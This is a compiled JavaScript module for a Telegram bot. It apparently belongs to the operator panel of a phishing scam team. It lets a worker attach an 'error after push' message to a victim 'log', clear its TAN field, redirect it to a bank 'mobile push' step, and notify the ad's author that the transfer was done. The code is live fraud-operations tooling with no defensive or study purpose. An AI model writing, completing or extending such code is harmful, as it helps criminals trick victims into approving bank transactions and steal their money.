"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../database");
const deleteAllMessages_1 = require("../../helpers/deleteAllMessages");
const bot_1 = require("../../utils/bot");
const getUsername_1 = require("../../helpers/getUsername");
exports.scene = new grammy_scenes_1.Scene('pushRedirectScene');
exports.composer = new grammy_1.Composer();
const regex = /log redirect mobilePush1.0 (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    await ctx.scenes.enter('pushRedirectScene', {
        id
    });
}
exports.scene.always().callbackQuery('cancel pushRedirectScene', async (ctx) => {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
});
exports.scene.do(async (ctx) => {
    ctx.session.logId = Number(ctx.scene.opts.arg.id);
    const msg = await ctx.reply("<b>⁉️ Введи ошибку после пуша:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel pushRedirectScene')
    });
    ctx.session.deleteMessage = [];
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().hears(/.+/, async (ctx) => {
    const log = await database_1.logsRepository.findOne({
        relations: ['ad', 'ad.author', 'ad.acceptedLog'],
        where: { id: ctx.session.logId }
    });
    ctx.session.text = ctx.msg.text;
    log.question = ctx.session.text.replaceAll('\n', '<br/>');
    log.tanText = '';
    log.redirectTo = 'lonelypups3ds';
    log.questionBtn = false;
    await database_1.logsRepository.save(log);
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
    await ctx.reply(`
👍 Запрос на редирект "MOBILE PUSH 1.0" успешно отправлен
`.replace(`\n`, ''), {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Закрыть", callback_data: 'deleteThisMessage' }]
            ]
        }
    });
    await bot_1.notificationBot.api.sendMessage(log.ad?.author?.tgId, `🔔 ${await (0, getUsername_1.getUsername)(log.ad.acceptedLog)} Выполнил перевод на mobile push`, {
        reply_to_message_id: log.msgWorkerId
    });
});
